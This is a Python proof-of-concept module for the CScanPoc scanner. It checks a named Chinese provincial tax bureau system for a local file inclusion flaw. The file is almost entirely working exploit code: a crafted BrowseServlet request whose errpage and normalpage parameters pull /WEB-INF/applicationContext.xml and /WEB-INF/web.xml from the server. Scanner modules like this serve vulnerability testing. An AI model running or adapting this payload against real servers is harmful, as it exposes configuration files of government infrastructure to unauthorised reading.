# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Shuiwu_0007' # 平台漏洞编号
    name = '辽宁省国家税务局系统存在文件包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2016-04-11'  # 漏洞公布时间
    desc = '''
        辽宁省国家税务局系统存在文件包含漏洞。
    ''' # 漏洞描述
    ref = '' #https://wooyun.shuimugan.com/bug/view?bug_no=169312
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '国税'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b86a810f-dc79-4ea4-a8c9-a86b60e6c109' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/BrowseServlet?szsat.trancode=401153&szsat.errpage=/WEB-INF/applicationContext.xml&szsat.normalpage=/WEB-INF/web.xml'
            response = requests.get(vul_url)
            html = response.content
            code = response.status_code
            if code == 200 and 'xml version' in html:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
